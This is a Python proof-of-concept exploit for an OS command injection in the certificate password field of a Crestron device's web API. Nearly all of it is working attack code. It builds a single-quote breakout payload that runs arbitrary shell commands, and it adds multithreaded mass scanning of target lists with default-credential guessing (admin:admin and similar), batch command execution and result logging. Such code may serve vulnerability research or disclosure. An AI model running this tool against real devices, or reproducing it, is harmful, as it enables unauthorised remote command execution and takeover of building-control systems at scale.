#!/usr/bin/env python3
"""
[REDACTED-ID]_001: Crestron Certificate Password OS Command Injection — PoC

Exploits: system("openssl pkcs12 -in %s -passin pass:'%s' ...") in a_console
  FUN_00027970 in a_console receives the certificate password with ZERO
  validation and interpolates it into a system() call wrapped in single
  quotes. A single quote in the password breaks out of the shell context.

Injection:
  password = test';COMMAND;echo '
  system() = openssl ... -passin pass:'test';COMMAND;echo '' -nodes ...
  Shell:     openssl(fails) ; COMMAND(executes) ; echo(cleanup)

Usage:
    # Single host with explicit creds:
    python3 cf3_001_cert_password_rce.py [REDACTED-INTERNAL-IP] -u admin -p admin -c "id"

    # Batch scan with default creds (admin:admin), results to file:
    python3 cf3_001_cert_password_rce.py -f targets.txt -c "id" -o results.txt

    # Recon only — probe auth + cert store, no injection:
    python3 cf3_001_cert_password_rce.py -f targets.txt --recon -o recon.txt

    # Try multiple credential pairs:
    python3 cf3_001_cert_password_rce.py -f targets.txt --creds admin:admin,admin:crestron,crestron:crestron

Default credentials tried: admin:admin, admin:crestron, crestron:crestron

Authors: [REDACTED] Team
Date:    2026-03-03
"""

import argparse
import base64
import json
import ssl
import sys
import time
import threading
import http.client
from concurrent.futures import ThreadPoolExecutor, as_completed


# ─── Configuration ──────────────────────────────────────────────────────────

REQUEST_TIMEOUT = 10

DEFAULT_CREDS = [
    ("admin", "admin"),
    ("admin", "crestron"),
    ("crestron", "crestron"),
]


# ─── HTTP Transport ─────────────────────────────────────────────────────────

def make_request(host, port, method, path, body=None, headers=None,
                 auth=None, use_ssl=True):
    """Make HTTP/HTTPS request. Returns (status, body)."""
    if headers is None:
        headers = {}
    if auth:
        creds = base64.b64encode(f"{auth[0]}:{auth[1]}".encode()).decode()
        headers["Authorization"] = f"Basic {creds}"
    try:
        if use_ssl:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            conn = http.client.HTTPSConnection(host, port, timeout=REQUEST_TIMEOUT,
                                                context=ctx)
        else:
            conn = http.client.HTTPConnection(host, port, timeout=REQUEST_TIMEOUT)

        conn.request(method, path, body=body, headers=headers)
        resp = conn.getresponse()
        resp_body = resp.read().decode("utf-8", errors="replace")
        status = resp.status
        conn.close()
        return status, resp_body
    except Exception as e:
        return 0, str(e)


# ─── Exploit Core ────────────────────────────────────────────────────────────

def build_injection_password(command):
    """Build single-quote breakout payload.

    a_console FUN_00027970:
      system("openssl pkcs12 -in %s -passin pass:'%s' -nodes ...")

    Input:   test';COMMAND;echo '
    Result:  pass:'test';COMMAND;echo '' -nodes ...
    """
    return f"test';{command};echo '"


def try_creds(host, port, use_ssl, cred_list):
    """Try credential pairs against /Device/DeviceInfo.
    Returns (username, password) on success, or None."""
    for user, pw in cred_list:
        status, body = make_request(host, port, "GET", "/Device/DeviceInfo",
                                    auth=(user, pw), use_ssl=use_ssl)
        if status == 200:
            return (user, pw)
    return None


def recon_host(host, port, use_ssl, cred_list):
    """Probe a host: connectivity, auth, cert store.

    Returns dict with:
      status:    'vulnerable' | 'auth_ok_no_certstore' | 'default_creds_fail' |
                 'no_web' | 'error'
      code:      HTTP status code
      creds:     (user, pass) that worked, or None
      detail:    description
    """
    result = {"host": host}

    # 1. Connectivity — can we reach the web interface at all?
    status, body = make_request(host, port, "GET", "/", use_ssl=use_ssl)
    if status == 0:
        result.update(status="error", code=0, creds=None,
                      detail=f"Connection failed: {body[:60]}")
        return result

    # 2. Does /Device exist? (expect 401 if auth is required)
    status, body = make_request(host, port, "GET", "/Device/DeviceInfo",
                                use_ssl=use_ssl)
    if status == 0:
        result.update(status="error", code=0, creds=None,
                      detail=f"Connection failed on /Device: {body[:60]}")
        return result
    if status == 404:
        result.update(status="no_web", code=404, creds=None,
                      detail="/Device endpoint not found")
        return result

    # 3. Try credentials
    valid = try_creds(host, port, use_ssl, cred_list)
    if not valid:
        result.update(status="default_creds_fail", code=401, creds=None,
                      detail=f"Auth required, none of {len(cred_list)} credential pairs worked")
        return result

    # 4. Check certificate store endpoint
    status, body = make_request(
        host, port, "GET", "/Device/CertificateStore",
        auth=valid, use_ssl=use_ssl)

    if status == 404:
        result.update(status="auth_ok_no_certstore", code=404, creds=valid,
                      detail=f"Authenticated as {valid[0]}, but /Device/CertificateStore not found")
        return result

    if status == 200:
        result.update(status="vulnerable", code=200, creds=valid,
                      detail=f"Authenticated as {valid[0]}, CertificateStore accessible")
        return result

    result.update(status="auth_ok_no_certstore", code=status, creds=valid,
                  detail=f"Authenticated as {valid[0]}, CertificateStore returned HTTP {status}")
    return result


def exploit_host(host, port, use_ssl, username, password, command):
    """Run [REDACTED-ID]_001 injection against a single host.
    Returns (success, output_string)."""

    injection = build_injection_password(command)
    payload = json.dumps({
        "certificate": "exploit.pfx",
        "password": injection
    })

    status, body = make_request(
        host, port, "POST",
        "/Device/CertificateStore/WebServer/AddCertificate",
        body=payload,
        headers={"Content-Type": "application/json"},
        auth=(username, password),
        use_ssl=use_ssl)

    if status == 0:
        return False, f"Connection failed: {body[:60]}"
    if status == 401:
        return False, "Auth rejected on exploit request"

    # Parse output from response
    try:
        data = json.loads(body)
        constructed = data.get("Command_Constructed", "")
        stderr = data.get("Command_Output", "")

        # Extract injected command output — appears after the echo cleanup marker
        marker = "echo '' -nodes 2>&1 | openssl x509 -checkend 0 -noout 2>&1"
        if marker in constructed:
            output = constructed.split(marker, 1)[1]
            output = output.split("Could not read certificate")[0].strip()
            if output:
                return True, output

        # Fallback: return the constructed command (contains output inline)
        return True, constructed
    except json.JSONDecodeError:
        return True, body[:300]


# ─── Batch Operations ────────────────────────────────────────────────────────

def load_hosts(filepath):
    """Load host list from text file (one IP/hostname per line)."""
    hosts = []
    with open(filepath, "r") as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith("#"):
                hosts.append(line)
    return hosts


def parse_creds(creds_str):
    """Parse 'user:pass,user:pass' into list of tuples."""
    pairs = []
    for pair in creds_str.split(","):
        pair = pair.strip()
        if ":" in pair:
            u, p = pair.split(":", 1)
            pairs.append((u, p))
    return pairs if pairs else DEFAULT_CREDS


def run_batch_recon(hosts, port, use_ssl, cred_list, outfile, max_threads=20):
    """Recon scan: probe auth + cert store on each host (multithreaded)."""
    print(f"\n{'='*70}")
    print(f"  [REDACTED-ID]_001 RECON SCAN — {len(hosts)} hosts — {max_threads} threads")
    print(f"  Credentials: {', '.join(f'{u}:{p}' for u, p in cred_list)}")
    print(f"  Output: {outfile}")
    print(f"{'='*70}\n")

    counts = {"vulnerable": 0, "auth_ok_no_certstore": 0,
              "default_creds_fail": 0, "no_web": 0, "error": 0}
    lock = threading.Lock()
    progress = [0]
    total = len(hosts)
    results_list = [None] * total  # preserve order

    def _worker(idx, host):
        r = recon_host(host, port, use_ssl, cred_list)
        tag = r["status"].upper()
        with lock:
            progress[0] += 1
            counts[r["status"]] = counts.get(r["status"], 0) + 1
            print(f"  [{progress[0]:>4}/{total}] {host:<40s} [{tag:<24s}] {r['detail']}")
            sys.stdout.flush()
        results_list[idx] = r
        return r

    with ThreadPoolExecutor(max_workers=max_threads) as pool:
        futures = {pool.submit(_worker, i, h): i for i, h in enumerate(hosts)}
        for f in as_completed(futures):
            f.result()  # propagate exceptions

    # Write results in original host order
    with open(outfile, "w") as f:
        f.write(f"# [REDACTED-ID]_001 Recon — {total} hosts — {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"# Credentials tried: {', '.join(f'{u}:{p}' for u, p in cred_list)}\n")
        f.write(f"# Threads: {max_threads}\n")
        f.write(f"# Format: IP | STATUS | DETAIL\n\n")
        for r in results_list:
            tag = r["status"].upper()
            host = r["host"]
            if r["status"] == "vulnerable":
                f.write(f"{host} | VULNERABLE | {r['detail']}\n")
            else:
                f.write(f"{host} | {tag} | {r['detail']}\n")

    print(f"\n{'='*70}")
    print(f"  RECON SUMMARY")
    print(f"{'='*70}")
    print(f"  VULNERABLE (auth + certstore): {counts.get('vulnerable', 0):>4}  ← EXPLOITABLE")
    print(f"  AUTH OK, no certstore:         {counts.get('auth_ok_no_certstore', 0):>4}")
    print(f"  DEFAULT CREDS FAILED:          {counts.get('default_creds_fail', 0):>4}")
    print(f"  NO WEB INTERFACE:              {counts.get('no_web', 0):>4}")
    print(f"  CONNECTION ERROR:              {counts.get('error', 0):>4}")
    print(f"  TOTAL:                         {total:>4}")
    print(f"{'='*70}")
    print(f"  Results written to: {outfile}")

    return counts


def run_batch_exploit(hosts, port, use_ssl, cred_list, command, outfile, max_threads=20):
    """Exploit scan: auth + inject on each host (multithreaded)."""
    print(f"\n{'='*70}")
    print(f"  [REDACTED-ID]_001 BATCH EXPLOIT — {len(hosts)} hosts — {max_threads} threads")
    print(f"  Credentials: {', '.join(f'{u}:{p}' for u, p in cred_list)}")
    print(f"  Command: {command}")
    print(f"  Output:  {outfile}")
    print(f"{'='*70}\n")

    succeeded = [0]
    total_skip = [0]
    lock = threading.Lock()
    progress = [0]
    total = len(hosts)
    results_list = [None] * total  # preserve order

    def _worker(idx, host):
        # Recon first
        r = recon_host(host, port, use_ssl, cred_list)

        if r["status"] != "vulnerable":
            tag = r["status"].upper()
            with lock:
                progress[0] += 1
                total_skip[0] += 1
                print(f"  [{progress[0]:>4}/{total}] {host:<40s} [SKIP] {tag}")
                sys.stdout.flush()
            results_list[idx] = {"host": host, "tag": tag, "detail": r["detail"],
                                 "vuln": False}
            return

        # Exploit
        user, pw = r["creds"]
        ok, output = exploit_host(host, port, use_ssl, user, pw, command)

        with lock:
            progress[0] += 1
            if ok:
                succeeded[0] += 1
                print(f"  [{progress[0]:>4}/{total}] {host:<40s} [VULN] {user}:{pw} → {output[:60]}")
            else:
                print(f"  [{progress[0]:>4}/{total}] {host:<40s} [FAIL] {output[:60]}")
            sys.stdout.flush()

        output_oneline = output.replace("\n", " | ") if output else ""
        results_list[idx] = {"host": host, "vuln": ok, "creds": f"{user}:{pw}",
                             "output": output_oneline,
                             "tag": "VULNERABLE" if ok else "EXPLOIT_FAILED",
                             "detail": output}

    with ThreadPoolExecutor(max_workers=max_threads) as pool:
        futures = {pool.submit(_worker, i, h): i for i, h in enumerate(hosts)}
        for f in as_completed(futures):
            f.result()

    # Write results in original host order
    with open(outfile, "w") as f:
        f.write(f"# [REDACTED-ID]_001 Exploit — {total} hosts — {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"# Command: {command}\n")
        f.write(f"# Credentials: {', '.join(f'{u}:{p}' for u, p in cred_list)}\n")
        f.write(f"# Threads: {max_threads}\n")
        f.write(f"# Format: IP | STATUS | OUTPUT\n\n")
        for r in results_list:
            host = r["host"]
            if r["vuln"]:
                f.write(f"{host} | VULNERABLE | creds={r['creds']} | {r['output']}\n")
            else:
                f.write(f"{host} | {r['tag']} | {r.get('detail', '')}\n")

    print(f"\n{'='*70}")
    print(f"  BATCH RESULTS")
    print(f"{'='*70}")
    print(f"  VULNERABLE:  {succeeded[0]:>4}")
    print(f"  SKIPPED:     {total_skip[0]:>4}")
    print(f"  TOTAL:       {total:>4}")
    print(f"{'='*70}")
    print(f"  Results written to: {outfile}")

    return succeeded[0]


# ─── Single-Host Mode ────────────────────────────────────────────────────────

def run_single(host, port, use_ssl, username, password, command):
    """Full verbose exploit against a single host."""
    proto = "https" if use_ssl else "http"

    print(f"\n{'='*70}")
    print(f"  [REDACTED-ID]_001: CERTIFICATE PASSWORD COMMAND INJECTION")
    print(f"  Target:  {proto}://{host}:{port}")
    print(f"  Creds:   {username}:{'*' * len(password)}")
    print(f"  Command: {command}")
    print(f"{'='*70}")

    # Auth check
    print(f"\n[STEP 1/3] Authenticating...")
    status, body = make_request(host, port, "GET", "/Device/DeviceInfo",
                                auth=(username, password), use_ssl=use_ssl)
    if status == 0:
        print(f"    [FAIL] Connection failed: {body}")
        return False
    if status == 401:
        print(f"    [FAIL] Authentication failed (HTTP 401)")
        return False
    print(f"    [PASS] Authenticated as '{username}' (HTTP {status})")

    # Cert store check
    print(f"\n[STEP 2/3] Checking CertificateStore endpoint...")
    status, body = make_request(host, port, "GET", "/Device/CertificateStore",
                                auth=(username, password), use_ssl=use_ssl)
    if status == 404:
        print(f"    [FAIL] /Device/CertificateStore not found (HTTP 404)")
        return False
    print(f"    [PASS] CertificateStore accessible (HTTP {status})")

    # Inject
    injection = build_injection_password(command)
    print(f"\n[STEP 3/3] Injecting via certificate password...")
    print(f"           Payload: {injection}")

    ok, output = exploit_host(host, port, use_ssl, username, password, command)

    if ok:
        print(f"\n{'='*70}")
        print(f"  COMMAND OUTPUT:")
        print(f"{'='*70}")
        print(f"\n{output}\n")
        print(f"{'='*70}")
    else:
        print(f"\n    [FAIL] {output}")

    return ok


# ─── Entry Point ─────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="[REDACTED-ID]_001: Crestron Certificate Password Command Injection",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Single host:
  %(prog)s [REDACTED-INTERNAL-IP] -u admin -p admin -c "id"

Batch scan (default creds admin:admin, results to file):
  %(prog)s -f targets.txt -c "id" -o results.txt

Recon only (probe auth + cert store, no injection):
  %(prog)s -f targets.txt --recon -o recon.txt

Custom credentials:
  %(prog)s -f targets.txt --creds admin:admin,admin:crestron,crestron:crestron

Custom port / no SSL:
  %(prog)s -f targets.txt --port 80 --no-ssl --recon

Injection Mechanics:
  password = test';COMMAND;echo '
  system("openssl ... -passin pass:'test';COMMAND;echo '' -nodes ...")
  Shell: openssl(fails) ; COMMAND(executes) ; echo(cleanup)
        """)

    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("host", nargs="?", default=None,
        help="Single target IP or hostname")
    group.add_argument("-f", "--file",
        help="File with target IPs/hostnames (one per line)")

    parser.add_argument("-c", "--command", default="id",
        help="OS command to execute (default: id)")
    parser.add_argument("-u", "--username", default="admin",
        help="Username for single-host mode (default: admin)")
    parser.add_argument("-p", "--password", default="admin",
        help="Password for single-host mode (default: admin)")
    parser.add_argument("--creds", default=None,
        help="Credential pairs for batch: user:pass,user:pass "
             "(default: admin:admin,admin:crestron,crestron:crestron)")
    parser.add_argument("-o", "--output", default=None,
        help="Output results file (default: cf3_001_results.txt)")
    parser.add_argument("--port", type=int, default=443,
        help="Target port (default: 443)")
    parser.add_argument("--no-ssl", action="store_true",
        help="Use HTTP instead of HTTPS")
    parser.add_argument("--recon", action="store_true",
        help="Recon only — probe auth + cert store, no injection")
    parser.add_argument("-t", "--threads", type=int, default=20,
        help="Number of concurrent threads for batch mode (default: 20)")

    args = parser.parse_args()
    use_ssl = not args.no_ssl
    if args.no_ssl and args.port == 443:
        args.port = 80

    # ─── Batch mode ──────────────────────────────────────────────────────
    if args.file:
        try:
            hosts = load_hosts(args.file)
        except FileNotFoundError:
            print(f"[!] File not found: {args.file}", file=sys.stderr)
            sys.exit(1)
        if not hosts:
            print(f"[!] No hosts found in {args.file}", file=sys.stderr)
            sys.exit(1)

        cred_list = parse_creds(args.creds) if args.creds else DEFAULT_CREDS
        outfile = args.output or "cf3_001_results.txt"

        if args.recon:
            counts = run_batch_recon(hosts, args.port, use_ssl, cred_list,
                                     outfile, max_threads=args.threads)
            sys.exit(0 if counts.get("vulnerable", 0) > 0 else 1)
        else:
            vuln_count = run_batch_exploit(hosts, args.port, use_ssl, cred_list,
                                           args.command, outfile,
                                           max_threads=args.threads)
            sys.exit(0 if vuln_count > 0 else 1)

    # ─── Single-host mode ────────────────────────────────────────────────
    if args.recon:
        cred_list = parse_creds(args.creds) if args.creds else [(args.username, args.password)]
        r = recon_host(args.host, args.port, use_ssl, cred_list)
        tag = r["status"].upper()
        print(f"{args.host}: [{tag}] {r['detail']}")
        sys.exit(0 if r["status"] == "vulnerable" else 1)

    success = run_single(args.host, args.port, use_ssl,
                         args.username, args.password, args.command)
    sys.exit(0 if success else 1)


if __name__ == "__main__":
    main()
